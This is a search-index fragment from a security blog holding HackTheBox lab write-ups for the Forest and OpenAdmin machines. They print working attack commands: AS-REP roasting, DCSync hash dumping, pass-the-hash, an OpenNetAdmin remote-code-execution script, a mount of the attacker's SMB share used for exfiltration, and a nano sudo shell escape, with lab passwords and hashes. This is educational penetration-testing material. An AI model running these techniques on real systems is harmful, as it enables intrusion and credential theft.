I\u0026rsquo;ll set netcat listener on port 4444\n→ root@iamf «remote» «10.10.14.3» $ nc -nvlp 4444 Now on Remote, I can just start the service.\nPS C:\\\u0026gt; sc.exe start usosvc I don\u0026rsquo;t have any screenshots, but that should work.\n References  https://book.hacktricks.xyz/pentesting/nfs-service-pentesting  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-remote/","summary":"Remote features an instance of Umbraco CMS which is vulnerable to an authenticated remote code execution (RCE). Enumeration of publicly accessible backup on NFS share finds credentials. These credentials allows me to gain a foothold in the system. Enumerating with WinPEAS finds two privilege escalation vectors: TeamViewer7 and service abuse. TeamViewer7 is found to be vulnerable to CVE-2019–18988, and Metasploit has a module for this CVE and it allows me to obtain the TeamViewer credentials.","tags":["OSCP-like","Windows","NFS","Metasploit","TeamViewer","CVE-2019-18988","Service-hijack"],"title":"HackTheBox - Remote"},{"content":"When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.\nOn Forest, enumeration of RPC service with anonymous logon/null session finds Active Directory users account. With these accounts, AS-REP Roasting attack can be performed to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains the password hash of the user that can be cracked offline, and further allows me gain a foothold into the machine. For the root part, the service account permissions allows me to grant myself a DCsync rights, this can be leveraged to pull Active Directory NTLM hashes and use them to gain access as NT Authority\\SYSTEM.\nSkills Learned  AS-REP roasting AD recon using BloodHound Creating network drive Abusing DCSync rights  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux rpcclient - Preinstalled in Kali Linux Evil-WinRM - https://github.com/Hackplayers/evil-winrm BloodHound - https://github.com/BloodHoundAD/BloodHound Impacket - https://github.com/SecureAuthCorp/impacket  Reconnaissance Nmap → root@iamf «forest» «10.10.14.116» $ nmap -sV -sC -oA nmap/initial-forest 10.10.10.171 -v  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all format (xml, nmap, gnmap) -v, verbose mode.  ...\u0026lt;SNIP\u0026gt;... PORT STATE SERVICE VERSION 53/tcp open domain? | fingerprint-strings: | DNSVersionBindReqTCP: | version |_ bind 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2020-03-21 08:18:45Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 445/tcp open microsoft-ds Windows Server 2016 Standard 14393 microsoft-ds (workgroup: HTB) 464/tcp open kpasswd5? 593/tcp open ncacn_http Microsoft Windows RPC over HTTP 1.0 636/tcp open tcpwrapped 3268/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: htb.local, Site: Default-First-Site-Name) 3269/tcp open tcpwrapped 1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service : SF-Port53-TCP:V=7.80%I=7%D=3/21%Time=5E75CC69%P=x86_64-pc-linux-gnu%r(DNSV SF:ersionBindReqTCP,20,\u0026#34;\\0\\x1e\\0\\x06\\x81\\x04\\0\\x01\\0\\0\\0\\0\\0\\0\\x07version\\ SF:x04bind\\0\\0\\x10\\0\\x03\u0026#34;); Service Info: Host: FOREST; OS: Windows; CPE: cpe:/o:microsoft:windows Host script results: |_clock-skew: mean: 2h26m25s, deviation: 4h02m30s, median: 6m24s | smb-os-discovery: | OS: Windows Server 2016 Standard 14393 (Windows Server 2016 Standard 6.3) | Computer name: FOREST | NetBIOS computer name: FOREST\\x00 | Domain name: htb.local | Forest name: htb.local | FQDN: FOREST.htb.local |_ System time: 2020-03-21T01:21:11-07:00 | smb-security-mode: | account_used: guest | authentication_level: user | challenge_response: supported |_ message_signing: required | smb2-security-mode: | 2.02: |_ Message signing enabled and required | smb2-time: | date: 2020-03-21T08:21:14 |_ start_date: 2020-03-20T05:27:17 ...\u0026lt;SNIP\u0026gt;... From the scan results, I\u0026rsquo;m dealing with a domain controller of an Active Directory system.\nWhen it comes to an Active Directory, I often to see people begin their enumeration from SMB (445) and sometimes LDAP (389). I\u0026rsquo;ll also follow that sequence because these three ports are most likely to allow anonymous login.\nEnumeration TCP 139,445 - SMB I can authenticate myself as anonymous/null session using both smbclient and rppclient. With current access I could get list of users and groups but not to file shares.\n→ root@iamf «forest» «10.10.14.116» $ rpcclient -U \u0026#39;%\u0026#39; \u0026#39;10.10.10.161\u0026#39; rpcclient $\u0026gt; rpcclient $\u0026gt; enumdomusers user:[Administrator] rid:[0x1f4] user:[Guest] rid:[0x1f5] user:[krbtgt] rid:[0x1f6] user:[DefaultAccount] rid:[0x1f7] ...\u0026lt;SNIP\u0026gt;... user:[sebastien] rid:[0x479] user:[lucinda] rid:[0x47a] user:[svc-alfresco] rid:[0x47b] user:[andy] rid:[0x47e] user:[mark] rid:[0x47f] user:[santi] rid:[0x480] I use this blog post from SANS as my reference.\nFoothold Shell as svc-alfresco ASREP Roasting In Active Directory, users with Kerberos pre-authentication disabled are vulnerable to what is known as AS-REP roasting attack.\nWhen Kerberos is used as the authentication protocol and the pre-auth is enabled, the client or user must include a timestamp encrypted with their password hash for each request they send (KRB_AS_REQ). If the server reads a valid time** after decrypting the request using the user\u0026rsquo;s password stored in SAM, it gives the user a ticket-granting-ticket (TGT) along with a session key encrypted with the user\u0026rsquo;s password as the response (KRB_AS_REP).\nNow, if the preauth is disabled, timestamp is not needed. As a result, an attacker could send a replay attack/dummy request to obtain the TGT and brute force it offline (read more about it here).\n **5 minutes is the default tolerance\n Below is the overview of the Kerberos mechanism. The AS-REP roasting process is indicated by the red circle (or oval I guess?).\n Taken from \u0026ldquo;Vulnerability Assessment of Authentication Methods in a Large-Scale Computer System\u0026rdquo; by David Freimanis\n A tool called GetNPUsers.py can be used to initiate a dummy request for AS-REP roasting. Here, the tool captured svc-alfresco\u0026rsquo;s TGT.\n→ root@iamf «forest» «10.10.14.116» $ GetNPUsers.py -dc-ip \u0026#39;10.10.10.171\u0026#39; -request htb.local/ -usersfile users -format Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation Name MemberOf PasswordLastSet LastLogon UAC ------------ ------------------------------------------------------ -------------------------- -------------------------- -------- svc-alfresco CN=Service Accounts,OU=Security Groups,DC=htb,DC=local 2020-03-26 09:40:41.035829 2020-03-26 09:41:40.077493 0x410200 $krb5asrep$23$svc-alfresco@HTB.LOCAL:cf77e95a8a50a6d7b298c46e851e93a7$ea7045cfe9b7583ebd9ba81934cf51330863f66e8b3c2c542981f6317b851980eae4e1a23048e95003cfb38c692075cabf9e3da009e3b1a0e17a34f6fd5d27aa1869a458faee9eff4bdbf5f5f3aaf826caf7e0326f52a522b630becd8f636b8b2fd11af194a18e86d07ad8a55299739684d8be527a9e75e16480db5177841cc7f54ab98891d1691b6ab7f4cbc576d0036820a6c3e59aeaee32e88628c88929e522af9b98ce169ea3bc369551a2925c76bd64e13a7a312119552dad92e9a43814e9033c5ad7d4d4c9808a968ebcc269a52e1f458a4d98c5d930068c52d15c5385c2d71f90933a Cracking TGT The obtained TGT can be cracked with dictionary attack using hashcat.\n$ hashcat64.exe -m 18200 svcalfresco.txt rockyou.txt -O The password is s3rvice.\nWinRM - svc-alfresco User svc-alfresco can login remotely via WinRM using evil-winrm.\n→ root@iamf «forest» «10.10.14.116» $ evil-winrm -i \u0026#39;10.10.10.161\u0026#39; -u svc-alfresco -p s3rvice User flag is done here.\n  Privilege Escalation Shell as NT Authority\\SYSTEM Enumeration with BloodHound BloodHound is a great tool to collect more information about object relationships within this Active Directory.\nFirst, I’ll host my own shares using smbserver.py from Impacket. This will make it easier for data exfiltration and clean up.\n→ root@iamf «shares» «10.10.14.116» $ smbserver.py myfj . -smb2support -username iamf -password iamf On Forest, I’ll use my share as a network drive.\n*Evil-WinRM* PS C:\\\u0026gt; $pass = ConvertTo-SecureString \u0026#39;belompi\u0026#39; -AsPlainText -Force *Evil-WinRM* PS C:\\\u0026gt; $cred = New-Object System.management.automation.pscredential(\u0026#39;mikun\u0026#39;, $pass) *Evil-WinRM* PS C:\\\u0026gt; New-PSDrive -Name mikun -PSProvider FileSystem -Credential $cred -Root \\\\[tun0ip]\\myfj *Evil-WinRM* PS C:\\\u0026gt; cd mikun: I\u0026rsquo;ve already copied SharpHound.exe, the BloodHound ingestor, to my share.\n  I’ll start collecting data with -c all option to collect all.\n*Evil-WinRM* PS mikun:\\\u0026gt; .\\SharpHound.exe -c all After it finishes, I’ll fire up BloodHound GUI and then load the collected data by drag and drop.\n→ root@iamf «forest» «10.10.14.116» $ neo4j console \u0026amp; → root@iamf «forest» «10.10.14.116» $ bloodhound --no-sandbox \u0026amp; I marked svc-alfresco as owned then used BloodHound pre-built analytics queries “Shortest Path from Owned Principal” to find the shortest path from svc-alfresco to domain admin.\nPath explanation, from top (nearest path to domain admin) to the bottom:\n Exchange Windows Permissions group has WriteDacl permission on AD domain. It simply allows you to modify the domain object’s permissions. Users, groups, computers, shares are domain objects. Account Operators group has GenericAll permissions on Exchange Windows Permissions group. It allows you to modify group membership like adding/removing a user to/from the group. Account Operators members have the ability to create a user. Privileged IT Accounts group has direct membership to the Account Operators group. User svc-alfresco is a direct member of Service Account group and it has indirect membership to the Privileged IT Accounts and the Account Operators group  Based on the path, here is the plan:\n Leverage Account Operators indirect membership to create a new user and join it to Exchange Windows Permission group Leverage Exchange Windows Permissions group permission to grant DS-Replication-Get-Changes-All (DCSync) to the new user.  Credential Dumping with DCSync Rights In Forest, I\u0026rsquo;ll have to load PowerView.ps1 first.\n*Evil-WinRM* PS mikun:\\\u0026gt; Import-Module .\\powerview.ps1 Then I\u0026rsquo;ll create a new user and join it to the Exchange Windows Permissions group.\n*Evil-WinRM* PS mikun:\\\u0026gt; net user mikun password /add /domain *Evil-WinRM* PS mikun:\\\u0026gt; net group \u0026#34;Exchange Windows Permission\u0026#34; /add mikun After that, grant it DCSync rights\n*Evil-WinRM* PS mikun:\\\u0026gt; $pass = ConvertTo-SecureString \u0026#39;password\u0026#39; -AsPlainText -Force *Evil-WinRM* PS mikun:\\\u0026gt; *Evil-WinRM* PS mikun:\\\u0026gt; $cred = New-Object System.management.automation.pscredential(\u0026#39;mikun\u0026#39;, $pass) *Evil-WinRM* PS mikun:\\\u0026gt; *Evil-WinRM* PS mikun:\\\u0026gt; Add-DomainObjectAcl -Credential $cred -TargetIdentity \u0026#34;DC=htb, DC=local\u0026#34; -PrincipalIdentity mikun -Rights DCSync Now I can use secretsdump.py from Impacket with that user to perform a DCSync attack.\n→ root@iamf «forest» «10.10.14.116» $ secretsdump.py htb.local/mikun:\u0026#39;password\u0026#39;@10.10.10.161 Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation [-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied [*] Dumping Domain Credentials (domain\\uid:rid:lmhash:nthash) [*] Using the DRSUAPI method to get NTDS.DIT secrets htb.local\\Administrator:500:aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6::: Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: krbtgt:502:aad3b435b51404eeaad3b435b51404ee:819af826bb148e603acb0f33d17632f8::: DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0::: ... \u0026lt;SNIP\u0026gt; ... htb.local\\sebastien:1145:aad3b435b51404eeaad3b435b51404ee:96246d980e3a8ceacbf9069173fa06fc::: htb.local\\lucinda:1146:aad3b435b51404eeaad3b435b51404ee:4c2af4b2cd8a15b1ebd0ef6c58b879c3::: htb.local\\svc-alfresco:1147:aad3b435b51404eeaad3b435b51404ee:9248997e4ef68ca2bb47ae4e6f128668::: htb.local\\andy:1150:aad3b435b51404eeaad3b435b51404ee:29dfccaf39618ff101de5165b19d524b::: htb.local\\mark:1151:aad3b435b51404eeaad3b435b51404ee:9e63ebcb217bf3c6b27056fdcb6150f7::: htb.local\\santi:1152:aad3b435b51404eeaad3b435b51404ee:483d4c70248510d8e0acb6066cd89072::: ... \u0026lt;SNIP\u0026gt; ... [*] Cleaning up... psexec.py Administrator hash can be used with psexec.py from Impacket to gain shell access (pass-the-hash).\n→ root@iamf «forest» «10.10.14.116» $ psexec.py -hashes \u0026#39;aad3b435b51404eeaad3b435b51404ee:32693b11e6aa90eb43d32c72a07ceea6\u0026#39; administrator@10.10.10.161  References  https://www.sans.org/blog/plundering-windows-account-info-via-authenticated-smb-sessions/ https://www.diva-portal.org/smash/get/diva2:1358429/FULLTEXT01.pdf Kerberos Pre-Authentication: Why It Should Not Be Disabled - TechNet Articles - United States (English) - TechNet Wiki  ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-forest/","summary":"When I first joined HackTheBox, Forest was the first machine that I was trying to own. It was an overall easy to medium difficulty machine.\nOn Forest, enumeration of RPC service with anonymous logon/null session finds Active Directory users account. With these accounts, AS-REP Roasting attack can be performed to obtain a ticket-granting-ticket (TGT) of a service account. The TGT itself contains the password hash of the user that can be cracked offline, and further allows me gain a foothold into the machine.","tags":["OSCP-like","Windows","Active-Directory","Domain-controller","ASREP-roasting","BloodHound","SharpHound","PSDrive","DCSync","smbserver.py","psexec.py","Kerberos"],"title":"HackTheBox - Forest"},{"content":"OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally. The internal web has a logic flaw that allows me to obtain the SSH key of the second user. The second user is allowed to run a nano editor with sudo privileges, and this can be abused to gain root access.\nSkills Learned  OpenNetAdmin 18.1.1 exploitation Exploiting sudo privileges on nano  Tools  Kali Linux (Attacking Machine) - https://www.kali.org/ Nmap - Preinstalled in Kali Linux Dirb - Preinstalled in Kali Linux John The Ripper - https://www.openwall.com/john/  Reconnaissance Nmap → root@iamf «openadmin» «10.10.14.7» $ nmap -sV -sC -oA OpenAdmin \u0026#39;10.10.10.171\u0026#39; -v  -sC, to scan with default script -sV, to scan service version -oA, to save the output to all formats -v, verbose mode  PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 4b:98:df:85:d1:7e:f0:3d:da:48:cd:bc:92:00:b7:54 (RSA) | 256 dc:eb:3d:c9:44:d1:18:b1:22:b4:cf:de:bd:6c:7a:54 (ECDSA) |_ 256 dc:ad:ca:3c:11:31:5b:6f:e6:a4:89:34:7c:9b:e5:50 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Apache2 Ubuntu Default Page: It works Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel From the scan results, nmap found two open ports:\n An SSH service running on port 22 An HTTP service running on port 80  Also, from the scan above, the machine is likely running Ubuntu.\nAs SSH usually requires valid credentials and there\u0026rsquo;s is no straight exploit yet, hence further enumeration is needed.\nEnumeration TCP 80 - Website Visiting the standard http port only displays the Apache default page.\nDirectory Brute Force - dirb Running dirb against the web successfully discovered a few hidden paths.\n→ root@iamf «openadmin» «10.10.14.7» $ dirb http://10.10.10.171/ /usr/share/wordlists/dirb/common.txt -r ...\u0026lt;SNIP\u0026gt;... ---- Scanning URL: http://10.10.10.171/ ---- ==\u0026gt; DIRECTORY: http://10.10.10.171/artwork/ + http://10.10.10.171/index.html(CODE:200|SIZE:10918) ==\u0026gt; DIRECTORY: http:/10.10.10.171/music/ + http://10.10.10.171/server-status (CODE:200|SIZE:278) ...\u0026lt;SNIP\u0026gt;... /artwork/ Nothing here.\n/music/ The /music home page provides a login menu that points to http://openadmin.htb/ona\n/ona/ Visiting /ona/ brings me to an instance of OpenNetAdmin. It is a software for managing network related things.\nThere\u0026rsquo;s a warning on the page. It’s complaining about not running the latest version compared to the one currently in use (v18.1.1)\nFoothold Shell as www-data OpenNetAdmin 18.1.1 RCE Based on the version above, a quick search on exploit-db shows that the current instance of OpenNetAdmin is vulnerable to a remote code execution. The exploit PoC source code is as follows:\n#!/bin/bash  URL=\u0026#34;${1}\u0026#34; while true;do echo -n \u0026#34;$\u0026#34;; read cmd curl --silent -d \u0026#34;xajax=window_submit\u0026amp;xajaxr=1574117726710\u0026amp;xajaxargs[]=tooltips\u0026amp;xajaxargs[]=ip%3D%3E;echo \\\u0026#34;BEGIN\\\u0026#34;;${cmd};echo \\\u0026#34;END\\\u0026#34;\u0026amp;xajaxargs[]=ping\u0026#34; \u0026#34;${URL}\u0026#34; | sed -n -e \u0026#39;/BEGIN/,/END/ p\u0026#39; | tail -n +2 | head -n -1 done I saved the exploit to a file called OpenRCE.sh. I ran the exploit and it resulted in a shell access as www-data\n→ kali@kali «openadmin» «10.10.14.7» $ ./OpenRCE.sh http://10.10.10.171/ona/ $ id uid=33(www-data) gid=33(www-data) groups=33(www-data) $ hostname openadmin $ ip a 1: lo: \u0026lt;LOOPBACK,UP,LOWER_UP\u0026gt; mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000 link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00 inet 127.0.0.1/8 scope host lo valid_lft forever preferred_lft forever inet6 ::1/128 scope host valid_lft forever preferred_lft forever 2: ens160: \u0026lt;BROADCAST,MULTICAST,UP,LOWER_UP\u0026gt; mtu 1500 qdisc mq state UP group default qlen 1000 link/ether 00:50:56:b9:72:3a brd ff:ff:ff:ff:ff:ff inet 10.10.10.171/24 brd 10.10.10.255 scope global ens160 valid_lft forever preferred_lft forever inet6 dead:beef::250:56ff:feb9:723a/64 scope global dynamic mngtmpaddr valid_lft 86350sec preferred_lft 14350sec inet6 fe80::250:56ff:feb9:723a/64 scope link valid_lft forever preferred_lft forever Privilege Escalation Shell as jimmy Enumeration Upon enumerating the current working directory, a database credential is found in ./local/config/database_settings.inc.php.\n$ cat ./local/config/database_settings.inc.php \u0026lt;?php $ona_contexts=array ( \u0026#39;DEFAULT\u0026#39; =\u0026gt; array ( \u0026#39;databases\u0026#39; =\u0026gt; array ( 0 =\u0026gt; array ( \u0026#39;db_type\u0026#39; =\u0026gt; \u0026#39;mysqli\u0026#39;, \u0026#39;db_host\u0026#39; =\u0026gt; \u0026#39;localhost\u0026#39;, \u0026#39;db_login\u0026#39; =\u0026gt; \u0026#39;ona_sys\u0026#39;, \u0026#39;db_passwd\u0026#39; =\u0026gt; \u0026#39;n1nj4W4rri0R!\u0026#39;, \u0026#39;db_database\u0026#39; =\u0026gt; \u0026#39;ona_default\u0026#39;, \u0026#39;db_debug\u0026#39; =\u0026gt; false, ), ), \u0026#39;description\u0026#39; =\u0026gt; \u0026#39;Default data context\u0026#39;, \u0026#39;context_color\u0026#39; =\u0026gt; \u0026#39;#D3DBFF\u0026#39;, ), ); SSH access The password worked for user jimmy, but the user flag can not be found in jimmy’s home directory.\nShell as joanna Enumeration The find command is issued again to search files that is accessible or owned by user jimmy.\njimmy@openadmin:~$ find / -type f -user jimmy 2\u0026gt;/dev/null ...\u0026lt;SNIP\u0026gt;... /var/www/internal/main.php /var/www/internal/logout.php /var/www/internal/login.php ...\u0026lt;SNIP\u0026gt;... It successfully reveals that user jimmy has access to files in /var/www/internal/.\nBased on apache config, /var/www/internal is currently hosted locally on port 52846.\njimmy@openadmin:~$ cat /etc/apache2/sites-enabled/internal.conf Listen 127.0.0.1:52846 \u0026lt;VirtualHost 127.0.0.1:52846\u0026gt; ServerName internal.openadmin.htb DocumentRoot /var/www/internal \u0026lt;IfModule mpm_itk_module\u0026gt; AssignUserID joanna joanna \u0026lt;/IfModule\u0026gt; ErrorLog ${APACHE_LOG_DIR}/error.log CustomLog ${APACHE_LOG_DIR}/access.log combined \u0026lt;/VirtualHost\u0026gt; Code review - Improper redirection After inspecting the main.php source code from /var/www/internal/, a logic flaw was found on the first line.\njimmy@openadmin:/var/www/internal/$ cat main.php \u0026lt;?php session_start(); if (!isset ($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); }; # Open Admin Trusted # OpenAdmin $output = shell_exec(\u0026#39;cat /home/joanna/.ssh/id_rsa\u0026#39;); echo \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt; \u0026lt;html\u0026gt; \u0026lt;h3\u0026gt;Don\u0026#39;t forget your \u0026#34;ninja\u0026#34; password\u0026lt;/h3\u0026gt; Click here to logout \u0026lt;a href=\u0026#34;logout.php\u0026#34; tite = \u0026#34;Logout\u0026#34;\u0026gt;Session \u0026lt;/html\u0026gt; This line code has an improper redirection.\n\u0026lt;?php session_start(); if (!isset ($_SESSION[\u0026#39;username\u0026#39;])) { header(\u0026#34;Location: /index.php\u0026#34;); # `die();` or `exit();` function should be called here. \t}; ...\u0026lt;SNIP\u0026gt;... $output = shell_exec(\u0026#39;cat /home/joanna/.ssh/id_rsa\u0026#39;); echo \u0026#34;\u0026lt;pre\u0026gt;$output\u0026lt;/pre\u0026gt;\u0026#34;; ?\u0026gt;...\u0026lt;SNIP\u0026gt;... The code above checks users' sessions but it\u0026rsquo;s not complete yet because the die() or exit() function is missing, so the rest of the code below will be executed as well. Therefore, sending a normal request with curl (default without -L option) will prevent the page from redirection and then it renders joanna\u0026rsquo;s SSH key.\njimmy@openadmin:~$ curl -s http://127.0.0.1:52846/main.php Password cracking The private key is encrypted with a password. JtR can be used to crack an encrypted SSH key, but first, it must be converted to the hash form and this can be done by using ssh2john.py\n→ root@iamf «openadmin» «10.10.14.7» $ python ssh2john.py joanna_rsa \u0026gt; joanna_rsa.hash The password was successfully cracked within 17s. The cracking process is performed on my Windows machine.\njohn.exe user2.txt --wordlist=rockyou.txt SSH access Now I\u0026rsquo;m able to login as user joanna via SSH.\n→ root@iamf «openadmin» «10.10.14.7» $ ssh -i joanna_rsa joanna@10.10.10.171 The user flag is done here.\nShell as root Abusing sudo nano User joanna has sudo privileges on /bin/nano\n On linux boxes, whenever you own a valid user password, always check sudo -l !\n joanna@openadmin:~$ sudo -l Matching Defaults entries for joanna on openadmin: env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User joanna may run the following commands on openadmin: (ALL) NOPASSWD: /bin/nano /opt/priv A quick way to read the root flag is by issuing the command below,\njoanna@openadmin:~$ sudo /bin/nano /opt/priv and then hit CTRL + R to open a file, this allows us to read the root flag at /root/root.txt\n  To gain root shell, I\u0026rsquo;ll follow the instruction from GTFOBins page:\njoanna@openadmin:~$ sudo /bin/nano /opt/priv # Opening nano as root ^R^X # CTRL+R (read/open file), CTRL+X(execute command) reset; sh 1\u0026gt;\u0026amp;0 2\u0026gt;\u0026amp;0 # Escape from nano ","permalink":"https://fahmifj.github.io/writeups/hackthebox/htb-openadmin/","summary":"OpenAdmin is an easy difficulty machine from HackTheBox that starts off by finding an instance of OpenNetAdmin. This application is known to be vulnerable to a remote code execution, which then can be leveraged to gain a foothold on the system. Enumeration inside the box finds a database credentials and it is reused by one of the users. The first user has access to web resources that are currently hosted internally.","tags":["OSCP-like","Linux","Code-review","Webshell","Password-cracking","sudo","GTFOBins"],"title":"HackTheBox - OpenAdmin"},{"content":"Work-in-progress \u0026hellip;\nTools Title A Description A  Title B Description B  Title C Description C   Others Wreath Penetration Test Report \n A penetration test report for TryHackMe wreath.    ","permalink":"https://fahmifj.github.io/projects/","summary":"Work-in-progress \u0026hellip;\nTools Title A Description A  Title B Description B  Title C Description C   Others Wreath Penetration Test Report \n A penetration test report for TryHackMe wreath.    ","tags":null,"title":"Projects [draft]"}]